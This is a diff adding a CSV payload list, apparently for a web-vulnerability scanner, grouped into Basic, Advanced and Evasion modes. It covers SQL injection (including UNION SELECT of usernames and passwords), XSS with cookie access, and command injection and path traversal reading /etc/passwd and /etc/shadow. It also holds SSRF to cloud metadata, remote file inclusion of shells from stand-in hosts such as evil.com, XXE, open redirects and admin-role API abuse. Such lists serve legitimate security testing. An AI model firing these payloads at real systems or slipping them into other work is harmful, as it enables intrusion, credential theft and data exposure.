@@ -1,0 +1,315 @@
+﻿category,mode,index,payload
+SQL Injection,Basic,1,%27/**/OR/**/%27a%27=%27a
+SQL Injection,Basic,2,%27/**/OR/**/1=1#
+SQL Injection,Basic,3,%27%20AND%201=1--
+SQL Injection,Basic,4,%27%20or%20%271%27=%271
+SQL Injection,Basic,5,'/**/or/**/'1'='1
+SQL Injection,Basic,6,%2527%2520UNION%2520SELECT%2520NULL--
+SQL Injection,Basic,7,%27%20or%20%27%27=%27
+SQL Injection,Basic,8,%2527%2520OR%25201=1#
+SQL Injection,Basic,9,'/**/OR/**/'1'='1
+SQL Injection,Basic,10,%27%20OR%20EXISTS(SELECT%201)--
+SQL Injection,Basic,11,'/**/OR/**/'x'='x'--
+SQL Injection,Basic,12,'/**/OR/**/1=1#
+SQL Injection,Basic,13,'/**/UNION/**/SELECT/**/NULL--
+SQL Injection,Basic,14,' or 1=1--
+SQL Injection,Basic,15,%27%20OR%201=1#
+SQL Injection,Basic,16,'/**/or/**/'a'='a
+SQL Injection,Basic,17,%2527%2520OR%2520EXISTS(SELECT%25201)--
+SQL Injection,Basic,18,'/**/AND/**/1=1--
+SQL Injection,Basic,19,%27/**/OR/**/%271%27=%271
+SQL Injection,Basic,20,%27%20OR%201=1--
+SQL Injection,Basic,21,%27%20OR%20%27%27=%27
+SQL Injection,Basic,22,'/**/OR/**/1=1--
+SQL Injection,Basic,23,%2527%2520OR%25201=1--
+SQL Injection,Basic,24,'/**/OR/**/''='
+SQL Injection,Basic,25,%27/**/OR/**/%27%27=%27
+SQL Injection,Basic,26,%27/**/OR/**/%27x%27=%27x%27--
+SQL Injection,Basic,27,'/**/OR/**/EXISTS(SELECT/**/1)--
+SQL Injection,Basic,28,"%27%20union%20SELECT%20username,password%20FROM%20users--"
+SQL Injection,Basic,29,"%27%20UNION%20SELECT%20username,password%20FROM%20users--"
+SQL Injection,Basic,30,' AND 1=1--
+SQL Injection,Basic,31,'/**/or/**/''='
+SQL Injection,Basic,32,%27%20union%20SELECT%20NULL--
+SQL Injection,Basic,33,' or 1=1#
+SQL Injection,Basic,34,%27%20or%201=1#
+SQL Injection,Basic,35,'/**/or/**/1=1--
+SQL Injection,Basic,36,' union SELECT NULL--
+SQL Injection,Basic,37,%27%20OR%20%27x%27=%27x%27--
+SQL Injection,Basic,38,%27%20UNION%20SELECT%20NULL--
+SQL Injection,Basic,39,'/**/or/**/EXISTS(SELECT/**/1)--
+SQL Injection,Advanced,1,'/**/OR/**/''='
+SQL Injection,Advanced,2,'/**/or/**/EXISTS(SELECT/**/1)--
+SQL Injection,Advanced,3,%27%20OR%20EXISTS(SELECT%201)--
+SQL Injection,Advanced,4,'/**/or/**/'a'='a
+SQL Injection,Advanced,5,'/**/OR/**/1=1#
+SQL Injection,Advanced,6,'/**/or/**/'1'='1
+SQL Injection,Advanced,7,%27%20OR%20%27a%27=%27a
+SQL Injection,Advanced,8,%2527%2520OR%2520%2527x%2527=%2527x%2527--
+SQL Injection,Advanced,9,%27%20OR%20%27%27=%27
+SQL Injection,Advanced,10,"%2527%2520UNION%2520SELECT%2520username,password%2520FROM%2520users--"
+SQL Injection,Advanced,11,%27/**/OR/**/1=1--
+SQL Injection,Advanced,12,'/**/OR/**/'x'='x'--
+SQL Injection,Advanced,13,%27/**/UNION/**/SELECT/**/NULL--
+SQL Injection,Advanced,14,%27%20or%20%271%27=%271
+SQL Injection,Advanced,15,"'/**/union/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,16,%27/**/OR/**/%271%27=%271
+SQL Injection,Advanced,17,%27%20OR%20%271%27=%271
+SQL Injection,Advanced,18,'/**/OR/**/'a'='a
+SQL Injection,Advanced,19,%2527%2520UNION%2520SELECT%2520NULL--
+SQL Injection,Advanced,20,'/**/or/**/''='
+SQL Injection,Advanced,21,'/**/AND/**/1=1--
+SQL Injection,Advanced,22,%2527%2520AND%25201=1--
+SQL Injection,Advanced,23,'/**/OR/**/1=1--
+SQL Injection,Advanced,24,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,25,'/**/OR/**/EXISTS(SELECT/**/1)--
+SQL Injection,Advanced,26,%27%20OR%20%27x%27=%27x%27--
+SQL Injection,Advanced,27,%27%20OR%201=1--
+SQL Injection,Advanced,28,%2527%2520OR%2520EXISTS(SELECT%25201)--
+SQL Injection,Advanced,29,'/**/union/**/SELECT/**/NULL--
+SQL Injection,Advanced,30,'/**/or/**/1=1--
+SQL Injection,Advanced,31,'/**/or/**/1=1#
+SQL Injection,Advanced,32,%27/**/AND/**/1=1--
+SQL Injection,Advanced,33,'/**/or/**/'x'='x'--
+SQL Injection,Advanced,34,%27/**/OR/**/%27a%27=%27a
+SQL Injection,Advanced,35,"%27%20UNION%20SELECT%20username,password%20FROM%20users--"
+SQL Injection,Evasion,1,%252527%252520AND%2525201=1--
+SQL Injection,Evasion,2,%2527%2520OR%2520EXISTS(SELECT%25201)--
+SQL Injection,Evasion,3,%2527/**/OR/**/1=1--
+SQL Injection,Evasion,4,%27%20or%20EXISTS(SELECT%201)--
+SQL Injection,Evasion,5,%252527%252520OR%2525201=1--
+SQL Injection,Evasion,6,%27%20or%20%271%27=%271
+SQL Injection,Evasion,7,%27/**/OR/**/EXISTS(SELECT/**/1)--
+SQL Injection,Evasion,8,%27/**/union/**/SELECT/**/NULL--
+SQL Injection,Evasion,9,%27%20AND%201=1--
+SQL Injection,Evasion,10,%27%20or%20%27x%27=%27x%27--
+SQL Injection,Evasion,11,%2527/**/OR/**/EXISTS(SELECT/**/1)--
+SQL Injection,Evasion,12,%27/**/AND/**/1=1--
+SQL Injection,Evasion,13,%27/**/OR/**/1=1--
+SQL Injection,Evasion,14,%2527%2520OR%25201=1#
+SQL Injection,Evasion,15,%27/**/OR/**/1=1#
+SQL Injection,Evasion,16,"%252527%252520UNION%252520SELECT%252520username,password%252520FROM%252520users--"
+SQL Injection,Evasion,17,%2527%2520union%2520SELECT%2520NULL--
+SQL Injection,Evasion,18,%2527/**/AND/**/1=1--
+SQL Injection,Evasion,19,%2527%2520or%25201=1--
+SQL Injection,Evasion,20,%27%20union%20SELECT%20NULL--
+SQL Injection,Evasion,21,%2527/**/UNION/**/SELECT/**/NULL--
+SQL Injection,Evasion,22,%2527/**/OR/**/%2527x%2527=%2527x%2527--
+SQL Injection,Evasion,23,%2527%2520UNION%2520SELECT%2520NULL--
+SQL Injection,Evasion,24,%2527/**/OR/**/1=1#
+SQL Injection,Evasion,25,%27%20or%201=1#
+SQL Injection,Evasion,26,%252527%252520OR%2525201=1#
+SQL Injection,Evasion,27,%252527%252520OR%252520EXISTS(SELECT%2525201)--
+SQL Injection,Evasion,28,%2527/**/OR/**/%2527a%2527=%2527a
+SQL Injection,Evasion,29,"%2527%2520UNION%2520SELECT%2520username,password%2520FROM%2520users--"
+SQL Injection,Evasion,30,%2527%2520OR%25201=1--
+SQL Injection,Evasion,31,%2527%2520or%25201=1#
+SQL Injection,Evasion,32,"%2527/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Evasion,33,%27/**/or/**/%27a%27=%27a
+SQL Injection,Evasion,34,%27%20or%201=1--
+SQL Injection,Evasion,35,%27/**/OR/**/%27x%27=%27x%27--
+SQL Injection,Evasion,36,%27/**/OR/**/%27%27=%27
+SQL Injection,Evasion,37,%27/**/OR/**/%27a%27=%27a
+SQL Injection,Evasion,38,"%27/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+XSS,Basic,1,%3Ciframe%20src=javascript:alert(1)%3E
+XSS,Basic,2,%3Csvg%20onload=alert(1)%3E
+XSS,Basic,3,<img src=x onerror=alert(1)>
+XSS,Basic,4,<ScRiPt>prompt(1)</ScRiPt>
+XSS,Basic,5,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Basic,6,<body onload=alert(1)>
+XSS,Basic,7,<svg onload=alert(1)>
+XSS,Basic,8,%3Cimg%20src=x%20onerror=confirm(1)%3E
+XSS,Basic,9,<ScRiPt>alert(1)</ScRiPt>
+XSS,Basic,10,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Basic,11,<ScRiPt>alert(document.cookie)</ScRiPt>
+XSS,Basic,12,%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E
+XSS,Basic,13,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E
+XSS,Basic,14,%3Csvg%20onload=confirm(1)%3E
+XSS,Basic,15,%3Cscript%3Eprompt(1)%3C/script%3E
+XSS,Basic,16,%3Cscript%3Econfirm(1)%3C/script%3E
+XSS,Basic,17,<ScRiPt>confirm(1)</ScRiPt>
+XSS,Basic,18,%3Cscript%3Ealert(1)%3C/script%3E
+XSS,Basic,19,<svg onload=confirm(1)>
+XSS,Basic,20,<img src=x onerror=confirm(1)>
+XSS,Basic,21,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E
+XSS,Advanced,1,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Advanced,2,<img src=x onerror=alert(1)>
+XSS,Advanced,3,%3Ciframe%20src=javascript:alert(1)%3E
+XSS,Advanced,4,%3Csvg%20onload=confirm(1)%3E
+XSS,Advanced,5,<iframe src=javascript:alert(1)>
+XSS,Advanced,6,%3Cimg%20src=x%20onerror=confirm(1)%3E
+XSS,Advanced,7,<img src=x onerror=confirm(1)>
+XSS,Advanced,8,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E
+XSS,Advanced,9,<ScRiPt>confirm(1)</ScRiPt>
+XSS,Advanced,10,<svg onload=confirm(1)>
+XSS,Advanced,11,<body onload=alert(1)>
+XSS,Advanced,12,<ScRiPt>alert(document.cookie)</ScRiPt>
+XSS,Advanced,13,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Advanced,14,%3Cscript%3Econfirm(1)%3C/script%3E
+XSS,Advanced,15,<svg onload=alert(1)>
+XSS,Advanced,16,%3Csvg%20onload=alert(1)%3E
+XSS,Advanced,17,<ScRiPt>prompt(1)</ScRiPt>
+XSS,Advanced,18,%3Cscript%3Ealert(1)%3C/script%3E
+XSS,Advanced,19,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E
+XSS,Advanced,20,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E
+XSS,Advanced,21,%3Cbody%20onload=alert(1)%3E
+XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,2,%3Csvg%20onload=alert(1)%3E
+XSS,Evasion,3,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E
+XSS,Evasion,4,%3Cbody%20onload=alert(1)%3E
+XSS,Evasion,5,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E
+XSS,Evasion,6,%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E
+XSS,Evasion,7,%3Csvg%20onload=confirm(1)%3E
+XSS,Evasion,8,%3Cimg%20src=x%20onerror=confirm(1)%3E
+XSS,Evasion,9,%3Ciframe%20src=javascript:alert(1)%3E
+IDOR,Basic,1,user=4
+IDOR,Basic,2,id=102
+IDOR,Basic,3,id=5
+IDOR,Basic,4,user=3
+IDOR,Basic,5,id=3
+IDOR,Basic,6,account=3
+IDOR,Basic,7,id=4
+IDOR,Advanced,1,account=3
+IDOR,Advanced,2,id=5
+IDOR,Advanced,3,user=3
+IDOR,Advanced,4,id=102
+IDOR,Advanced,5,id=3
+IDOR,Advanced,6,user=4
+IDOR,Advanced,7,id=4
+IDOR,Evasion,1,id=4
+IDOR,Evasion,2,user=3
+IDOR,Evasion,3,id=3
+IDOR,Evasion,4,id=102
+IDOR,Evasion,5,id=5
+IDOR,Evasion,6,account=3
+IDOR,Evasion,7,user=4
+Command Injection,Basic,1,&&${IFS}uname${IFS}-a
+Command Injection,Basic,2,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Basic,3,;${IFS}pwd
+Command Injection,Basic,4,;${IFS}cat${IFS}/etc/passwd
+Command Injection,Basic,5,&&$IFSid
+Command Injection,Basic,6,&&${IFS}id
+Command Injection,Basic,7,;${IFS}whoami
+Command Injection,Basic,8,|$IFSwhoami
+Command Injection,Basic,9,;$IFScat$IFS/etc/passwd
+Command Injection,Basic,10,;$IFSwhoami
+Command Injection,Basic,11,|${IFS}whoami
+Command Injection,Basic,12,;${IFS}ls
+Command Injection,Basic,13,;$IFSpwd
+Command Injection,Basic,14,&&$IFSuname$IFS-a
+Command Injection,Advanced,1,&&$IFSuname$IFS-a
+Command Injection,Advanced,2,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Advanced,3,;${IFS}cat${IFS}/etc/passwd
+Command Injection,Advanced,4,|$IFScat$IFS/etc/passwd
+Command Injection,Advanced,5,;${IFS}whoami
+Command Injection,Advanced,6,&&$IFSid
+Command Injection,Advanced,7,|$IFSwhoami
+Command Injection,Advanced,8,|${IFS}whoami
+Command Injection,Advanced,9,;$IFSls
+Command Injection,Advanced,10,;$IFScat$IFS/etc/passwd
+Command Injection,Advanced,11,&&${IFS}id
+Command Injection,Advanced,12,;$IFSpwd
+Command Injection,Advanced,13,&&${IFS}uname${IFS}-a
+Command Injection,Advanced,14,;${IFS}ls
+Command Injection,Advanced,15,;$IFSwhoami
+Command Injection,Advanced,16,;${IFS}pwd
+Command Injection,Evasion,1,|$IFSwhoami
+Command Injection,Evasion,2,;$IFScat$IFS/etc/passwd
+Command Injection,Evasion,3,;$IFSls
+Command Injection,Evasion,4,;$IFSwhoami
+Command Injection,Evasion,5,;$IFSpwd
+Command Injection,Evasion,6,&&$IFSuname$IFS-a
+Command Injection,Evasion,7,&&$IFSid
+Path Traversal,Basic,1,..\..\..\..\windows\win.ini
+Path Traversal,Basic,2,../../../../../../etc/passwd
+Path Traversal,Basic,3,../../../boot.ini
+Path Traversal,Basic,4,../../../etc/passwd
+Path Traversal,Basic,5,../../../../etc/passwd
+Path Traversal,Basic,6,../../../etc/shadow
+Path Traversal,Basic,7,../../../../../etc/passwd
+Path Traversal,Basic,8,../../../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,1,..\..\..\..\windows\win.ini
+Path Traversal,Advanced,2,../../../../../etc/passwd
+Path Traversal,Advanced,3,../../../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,4,../../../etc/shadow
+Path Traversal,Advanced,5,../../../etc/passwd
+Path Traversal,Advanced,6,../../../../../../etc/passwd
+Path Traversal,Advanced,7,../../../../etc/passwd
+Path Traversal,Advanced,8,../../../boot.ini
+Path Traversal,Evasion,1,..\..\..\..\windows\win.ini
+Path Traversal,Evasion,2,../../../../../etc/passwd
+Path Traversal,Evasion,3,../../../../etc/passwd
+Path Traversal,Evasion,4,../../../etc/passwd
+Path Traversal,Evasion,5,../../../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Evasion,6,../../../../../../etc/passwd
+Path Traversal,Evasion,7,../../../etc/shadow
+Path Traversal,Evasion,8,../../../boot.ini
+SSRF,Basic,1,http://[::1]
+SSRF,Basic,2,http://0.0.0.0
+SSRF,Basic,3,http://127.0.0.1
+SSRF,Basic,4,http://169.254.169.254
+SSRF,Advanced,1,http://127.0.0.1
+SSRF,Advanced,2,http://0.0.0.0
+SSRF,Advanced,3,http://[::1]
+SSRF,Advanced,4,http://169.254.169.254
+SSRF,Evasion,1,http://127.0.0.1
+SSRF,Evasion,2,http://169.254.169.254
+SSRF,Evasion,3,http://0.0.0.0
+SSRF,Evasion,4,http://[::1]
+Local File Inclusion,Basic,1,../../../etc/passwd
+Local File Inclusion,Basic,2,../../../boot.ini
+Local File Inclusion,Basic,3,../../../../../../windows/win.ini
+Local File Inclusion,Basic,4,../../../../../../etc/passwd
+Local File Inclusion,Advanced,1,../../../etc/passwd
+Local File Inclusion,Advanced,2,../../../../../../etc/passwd
+Local File Inclusion,Advanced,3,../../../../../../windows/win.ini
+Local File Inclusion,Advanced,4,../../../boot.ini
+Local File Inclusion,Evasion,1,../../../etc/passwd
+Local File Inclusion,Evasion,2,../../../../../../windows/win.ini
+Local File Inclusion,Evasion,3,../../../../../../etc/passwd
+Local File Inclusion,Evasion,4,../../../boot.ini
+Remote File Inclusion,Basic,1,https://evil.com/shell.txt
+Remote File Inclusion,Basic,2,https://malicious.site/backdoor.txt
+Remote File Inclusion,Basic,3,https://attacker.com/payload.php
+Remote File Inclusion,Advanced,1,https://evil.com/shell.txt
+Remote File Inclusion,Advanced,2,https://malicious.site/backdoor.txt
+Remote File Inclusion,Advanced,3,https://attacker.com/payload.php
+Remote File Inclusion,Evasion,1,https://malicious.site/backdoor.txt
+Remote File Inclusion,Evasion,2,https://attacker.com/payload.php
+Remote File Inclusion,Evasion,3,https://evil.com/shell.txt
+XXE,Basic,1,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Basic,2,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Basic,3,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Advanced,1,"<!doctype data [<!entity file SYSTEM ""file:///etc/passwd"">]>"
+XXE,Advanced,2,"<!entity xxe SYSTEM ""file:///etc/passwd"">"
+XXE,Advanced,3,"<!doctype foo [ <!entity xxe SYSTEM ""file:///etc/passwd""> ]>"
+XXE,Evasion,1,%3C!doctype%20data%20[%3C!entity%20file%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E
+XXE,Evasion,2,%3C!doctype%20foo%20[%20%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20]%3E
+XXE,Evasion,3,%3C!entity%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E
+GraphQL Injection,Basic,1,"{users{id,password}}"
+GraphQL Injection,Basic,2,"{user(id:""1""){email}}"
+GraphQL Injection,Basic,3,{user(id:1){password}}
+GraphQL Injection,Advanced,1,"{user(id:""1""){email}}"
+GraphQL Injection,Advanced,2,{user(id:1){password}}
+GraphQL Injection,Advanced,3,"{users{id,password}}"
+GraphQL Injection,Evasion,1,%7Buser(id:1)%7Bpassword%7D%7D
+GraphQL Injection,Evasion,2,%7Buser(id:%221%22)%7Bemail%7D%7D
+GraphQL Injection,Evasion,3,"%7Busers%7Bid,password%7D%7D"
+Open Redirect,Basic,1,https://evil.com
+Open Redirect,Basic,2,https://attacker.com
+Open Redirect,Basic,3,//evil.com
+Open Redirect,Advanced,1,//evil.com
+Open Redirect,Advanced,2,https://attacker.com
+Open Redirect,Advanced,3,https://evil.com
+Open Redirect,Evasion,1,//evil.com
+Open Redirect,Evasion,2,https://evil.com
+Open Redirect,Evasion,3,https://attacker.com
+API Abuse,Basic,1,"{""role"":""admin""}"
+API Abuse,Basic,2,"{""access"":""root""}"
+API Abuse,Basic,3,"{""admin"":true}"
+API Abuse,Advanced,1,"{""role"":""admin""}"
+API Abuse,Advanced,2,"{""admin"":true}"
+API Abuse,Advanced,3,"{""access"":""root""}"
+API Abuse,Evasion,1,%7B%22role%22:%22admin%22%7D
+API Abuse,Evasion,2,%7B%22access%22:%22root%22%7D
+API Abuse,Evasion,3,%7B%22admin%22:true%7D
